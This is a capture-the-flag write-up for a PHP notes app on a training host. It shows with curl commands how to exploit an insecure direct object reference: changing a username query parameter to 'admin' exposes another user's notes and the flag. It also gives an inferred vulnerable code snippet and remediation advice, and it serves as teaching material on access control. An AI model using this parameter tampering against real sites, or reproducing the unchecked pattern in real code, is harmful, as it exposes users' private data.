# Broken Access Control — CTF Writeup

**Category:** Web Security
**Difficulty:** Medium
**Vulnerability:** Insecure Direct Object Reference (IDOR) / Broken Access Control (OWASP A01:2021)
**Flag:** `ctf{br0k3n_acc3ss_c0ntr0l_l3ads_t0_IDOR}`

---

## Target

```
http://ctf-akshay-broken-access-control-21fe7789.challenges.pentestgarage.com
```

## Summary

The application lets users register, log in, add "secret notes," and view
their own notes. The notes-viewing feature fetches notes by a `username`
GET parameter instead of deriving the identity from the authenticated
session (`PHPSESSID`). Because the server never checks that the requested
`username` matches the logged-in user, any authenticated user can view
**any other user's notes** — including the `admin` account's notes, which
contained the flag.

## Steps to Reproduce

### 1. Recon

```bash
curl "http://ctf-akshay-broken-access-control-21fe7789.challenges.pentestgarage.com"
```

Found a simple login/register form (`index.php`, PHP backend, session
cookie `PHPSESSID`).

### 2. Register a low-privilege account

```bash
curl -c cookies.txt "http://.../index.php" -o /dev/null

curl -c cookies.txt -b cookies.txt \
  -d "username=testuser&password=testpass123&register=Register" \
  "http://.../index.php" -L
```

### 3. Log in

```bash
curl -c cookies.txt -b cookies.txt \
  -d "username=testuser&password=testpass123&login=Login" \
  "http://.../index.php" -L
```

Redirects to `/dashboard.php` — a page where the user can add a note or
click **"See ALL Notes."** (Note the suspicious wording: *ALL* notes, not
*MY* notes — a strong hint toward the vulnerability.)

### 4. Add a note (to have a known baseline)

```bash
curl -b cookies.txt "http://.../dashboard.php" \
  -d "note=this is testuser secret note&add=ADD"
```

### 5. Trigger "See ALL Notes"

```bash
curl -b cookies.txt "http://.../dashboard.php" -d "view_notes=See+ALL+Notes" -v
```

Server responds with a redirect:

```
Location: /posts.php?username=testuser
```

This reveals the vulnerable endpoint: notes are looked up by a
**user-controlled `username` parameter**, not by session identity.

### 6. Exploit the IDOR

Request another user's notes by simply changing the parameter:

```bash
curl -b cookies.txt "http://.../posts.php?username=admin"
```

**Result:** the app returns the `admin` user's notes, including:

```
ctf{br0k3n_acc3ss_c0ntr0l_l3ads_t0_IDOR}
```

No re-authentication, role check, or ownership validation was performed —
the session cookie proved *who you are*, but `posts.php` trusted the
`username` query parameter instead of enforcing that it matches the
session owner.

## Root Cause

```php
// Vulnerable pattern (inferred)
$username = $_GET['username'];
$notes = getNotesForUser($username); // no check against $_SESSION['username']
```

## Remediation

- Never trust client-supplied identifiers (`username`, `id`, etc.) for
  authorization decisions.
- Derive the resource owner from the **server-side session**
  (`$_SESSION['username']`), not from request parameters.
- If a `username` parameter is required for other reasons, validate that
  it matches the authenticated user, or explicitly check role/permissions
  before returning data (object-level authorization check on every
  request).
- Apply the principle of least privilege and deny-by-default access
  control.

## Tools Used

- `curl` (manual request crafting/replay)
- Manual analysis of redirect locations and response bodies

## Timeline

1. Registered and logged in as `testuser`
2. Discovered `posts.php?username=` from the "See ALL Notes" redirect
3. Swapped `username=testuser` → `username=admin`
4. Retrieved admin's notes containing the flag
